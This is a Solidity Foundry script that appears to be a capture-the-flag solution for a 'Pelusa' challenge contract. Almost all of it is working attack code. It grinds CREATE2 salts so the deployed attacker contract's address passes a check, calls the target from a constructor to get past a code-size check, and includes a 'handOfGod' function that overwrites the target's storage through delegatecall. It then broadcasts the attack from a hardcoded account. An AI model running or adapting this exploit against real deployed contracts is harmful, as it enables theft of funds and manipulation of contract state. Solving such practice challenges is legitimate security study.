// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
import "forge-std/Script.sol";
interface IGame {
    function getBallPossesion() external view returns (address);
}

interface IPelusa {
    function goals() external view returns (uint256);

    function isGoal() external view returns (bool);

    function passTheBall() external;

    function shoot() external;
}

contract Diego {
    address internal player;

    uint256 public goals = 1;
    constructor(IPelusa addr) {
        addr.passTheBall();
    }

    function handOfGod() external returns (uint256) {
        goals = 2;
        return 22_06_1986;
    }

    function getBallPossesion() external pure returns (address) {
        return 0x7E832a2FE739b959c376B9bcd8e8115330AdBb9E;
    }
}

contract Create2Factory {
    function deploy(uint256 salt, IPelusa pelusa) external {
        new Diego{salt: bytes32(salt)}(pelusa);
    }

    function getBytecode(IPelusa addr) public pure returns (bytes memory) {
        bytes memory bytecode = type(Diego).creationCode;

        return abi.encodePacked(bytecode, abi.encode(address(addr)));
    }

    function getCreate2Address(
        bytes memory bytecode, 
        bytes32 salt
    ) public view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(bytecode))  
        );
        return address(uint160(uint256(hash)));
    }
}
contract PelusaScript is Script {
    IPelusa pelusa;

    address player = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
    function setUp() public {
        pelusa = IPelusa(0x394EdF27CC0c62870Ec7B872D77c9F6dBDAc3b6d);
    }
    function run() public {
        attack();
    }

    function attack() public {
        uint salt;
        address addr;
        vm.startBroadcast(player);
        Create2Factory factory = new Create2Factory();
        bytes memory bytecode = factory.getBytecode(pelusa);
        // vm.startPrank(player, player);
        for(uint i = 0; i < 1000; i++) {            
            addr = factory.getCreate2Address(
                bytecode, bytes32(i)
            );

            if(uint256(uint160(addr)) % 100 == 10) {
                console.log("Address =", addr, "salt =", i);
                salt = i;
                break;
            }
        }
        // vm.stopPrank();
        require(salt != 0, "No salt found");
        addr = factory.getCreate2Address(
            bytecode, bytes32(salt)
        );
        console.log("Address =", addr);
        // vm.prank(player, player);
        factory.deploy(salt, pelusa);

        require(pelusa.isGoal(), "No Goal");

        pelusa.shoot();

        require(pelusa.goals() == 2, "Failed");
        vm.stopBroadcast();
    }
}